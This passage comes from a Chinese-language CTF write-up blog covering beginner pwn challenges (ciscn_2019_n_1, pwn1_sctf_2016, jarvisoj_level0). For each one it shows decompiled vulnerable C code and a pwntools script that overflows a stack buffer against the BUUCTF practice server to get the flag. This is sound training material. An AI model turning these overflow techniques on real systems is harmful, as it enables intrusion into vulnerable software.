p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28074</span><span class="token punctuation">)</span>

buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40060d</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># flag&#123;02912f3b-c4e0-4a24-9f51-30a93e017b04&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>又是一道水题，并没学到更高深的东西。</p>
<h4 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h4><p><strong>TAG: gets栈溢出，满足条件</strong></p>
<p>又是一道gets的题，找到关键处的代码为</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">float</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>

  v2 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's guess the number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">11.28125</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Its value should be 11.28125"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>满足<code>v2 == 11.28125</code>即可获得flag，先看总的容量为<code>0x30</code>个字节的大小。</p>
<p>然后是将空间分成的是v1和v2两个部分，共是<code>0x30</code>，v2的大小为<code>0x4</code>。目标就是把v2这一块空间内的数据写成<code>11.28125</code>转为十六进制是<code>0x41348000</code>。</p>
<p>然后利用脚本就是下面的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27852</span><span class="token punctuation">)</span>

buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># flag&#123;652624f4-f9cc-498c-a675-42a5143e9b49&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h4><p><strong>TAG: 替换字符造成栈溢出</strong></p>
<p>这个对gets到的字符的个数有了限制，但是<code>strcpy(s, v0);</code>，v0可控似乎是，下面是反汇编出来的主要的c代码，说实话我没怎么看懂。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-3Ch] BYREF</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-1Ch] BYREF</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-18h] BYREF</span>
  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+47h] [ebp-11h] BYREF</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+48h] [ebp-10h] BYREF</span>
  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Fh] [ebp-9h] BYREF</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tell me something about yourself: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> edata<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">allocator</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"you"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">allocator</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"I"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">*</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span><span class="token function">allocator</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span><span class="token function">allocator</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So, %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里网上的教程说是前面间接有个对传入的内容有一个把<code>I</code>换成<code>you</code>的替换操作，这里就可以间接地造成栈溢出，感觉就像是web里面的<code>php反序列化的字符逃逸</code>，然后看看s的空间分配的大小是<code>0x3c</code></p>
<p><img src="/2021/05/28/CTF/image-20210718102812281.png" alt></p>
<p>然后<code>0x3c = 16x3+12 = 60</code>，传入<code>20</code>个<code>I</code>即可，可写payload如下</p>
<p><img src="/2021/05/28/CTF/image-20210718103142615.png" alt></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25512</span><span class="token punctuation">)</span>

buf_1 <span class="token operator">=</span> <span class="token string">b"I"</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span>  <span class="token comment"># 好像是因为32位的返回地址是4个字节，需要填充4个字符a</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># flag&#123;3ef70652-fbd5-4ee2-a6d0-b94061892eb1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h4 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h4><p><strong>TAG: read造成buf缓冲区溢出</strong></p>
<p>看有的wp说是read函数造成缓冲区溢出，下面是主要的代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后这个buf的大小是<code>0x80</code>也就是十进制的<code>128</code>，然后缓冲区溢出就是将栈的返回地址改成后门函数的地址，注意到数据栈的返回地址<code>(r)</code>是<code>0x8</code></p>
<p><img src="/2021/05/28/CTF/image-20210718125634274.png" alt></p>
<p>然后后门函数的地址为<code>0x400596</code></p>
<p><img src="/2021/05/28/CTF/image-20210718125729564.png" alt></p>
<p>所以利用方式如下所示</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25015</span><span class="token punctuation">)</span>

buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># flag&#123;3d0a1531-3486-4d69-aa6a-010088aa45bf&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h4><p><strong>TAG: </strong></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">M4XLMUM</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://a16n.github.io/2021/05/28/CTF/">https://a16n.github.io/2021/05/28/CTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://a16n.github.io" target="_blank">M4XLMUM</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/crypto/">crypto</a><a class="post-meta__tags" href="/tags/reverse/">reverse</a></div><div class="post_share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_wechat"></a><a class="a2a_button_sina_weibo"></a><a class="a2a_button_facebook_messenger"></a><a class="a2a_button_email"></a><a class="a2a_button_copy_link"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async="async" src="https://static.addtoany.com/menu/page.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><img class="prev-cover" src="/img/topimg/image-20210530010942776.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透测试</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/05/29/2021年各比赛wp/" title="2021年各比赛wp"><img class="cover" src="/img/topimg/image-20210530011121777.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-29</div><div class="title">2021年各比赛wp</div></div></a></div><div><a href="/2021/09/27/DASCTF9月赛X浙江工业大学秋季挑战赛/" title="DASCTF9月赛 X 浙江工业大学秋季挑战赛"><img class="cover" src="/img/topimg/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-27</div><div class="title">DASCTF9月赛 X 浙江工业大学秋季挑战赛</div></div></a></div><div><a href="/2021/09/27/使用ida进行动态调试的配置/" title="使用ida进行动态调试的配置"><img class="cover" src="/img/topimg/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-27</div><div class="title">使用ida进行动态调试的配置</div></div></a></div><div><a href="/2021/05/28/渗透测试/" title="渗透测试"><img class="cover" src="/img/topimg/image-20210530010942776.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-28</div><div class="title">渗透测试</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hack-The-Box"><span class="toc-number">2.</span> <span class="toc-text">Hack The Box</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">2.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E4%BC%A0%E5%8F%82-Emdee-five-for-life"><span class="toc-number">2.2.1.</span> <span class="toc-text">快速传参-Emdee five for life</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E3%80%81Jinja2-Templated"><span class="toc-number">2.2.2.</span> <span class="toc-text">SSTI、Jinja2-Templated</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-1"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%B8%8E%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.1.1.</span> <span class="toc-text">SQL注入常用函数与知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%90%E5%8F%96-substr%E3%80%81mid"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">字符串提取(substr、mid)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.2.</span> <span class="toc-text">SQL注入的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.1.2.3.</span> <span class="toc-text">盲注(时间盲注、布尔盲注)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.1.2.4.</span> <span class="toc-text">异或盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%E4%B8%8Epayload"><span class="toc-number">3.1.2.5.</span> <span class="toc-text">形成原理与payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.2.6.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xpath%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.2.7.</span> <span class="toc-text">xpath注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.2.8.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%B8%80%E8%88%ACpayload"><span class="toc-number">3.1.2.8.1.</span> <span class="toc-text">简单介绍与一般payload</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6Bypass"><span class="toc-number">3.1.2.9.</span> <span class="toc-text">绕过限制Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-1"><span class="toc-number">3.1.3.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">October 2019 Twice SQL Injection</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-1"><span class="toc-number">3.1.4.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5getshell%E3%80%81-SUCTF-2018-MultiSQL"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">sql注入getshell、[SUCTF 2018]MultiSQL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">3.2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.2.2.</span> <span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Jinja2"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">Jinja2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">3.3.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.3.1.</span> <span class="toc-text">PHP知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">php短标签绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">php空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.1.3.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.1.4.</span> <span class="toc-text">伪协议读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%B8%ADarray%E8%B5%8B%E5%80%BC%E5%A4%B1%E8%B4%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.1.5.</span> <span class="toc-text">php中array赋值失败绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E9%A2%98%E7%9B%AE"><span class="toc-number">3.3.2.</span> <span class="toc-text">PHP题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">[红明谷CTF 2021]write_shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">4.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">编码与密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">4.1.1.</span> <span class="toc-text">一些特殊编码的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DDCTF2018-%E2%95%AF%C2%B0%E2%96%A1%C2%B0%EF%BC%89%E2%95%AF%EF%B8%B5-%E2%94%BB%E2%94%81%E2%94%BB"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">[DDCTF2018](╯°□°）╯︵ ┻━┻</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCTF2019-draw"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">[RCTF2019]draw</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%9C%BA%E6%8C%89%E9%94%AE%E9%9F%B3"><span class="toc-number">4.1.2.</span> <span class="toc-text">手机按键音</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WUSTCTF2020-girlfriend"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">[WUSTCTF2020]girlfriend</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#W%E5%9E%8B%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.3.</span> <span class="toc-text">W型栅栏密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.4.</span> <span class="toc-text">栅栏密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9B-%E9%80%9A%E8%A1%8C%E8%AF%81"><span class="toc-number">4.1.4.1.</span> <span class="toc-text">[XMAN2018排位赛]通行证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="toc-number">4.2.</span> <span class="toc-text">内存取证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="toc-number">4.2.1.</span> <span class="toc-text">工具安装与使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#volatility%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">volatility安装使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">4.2.1.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item 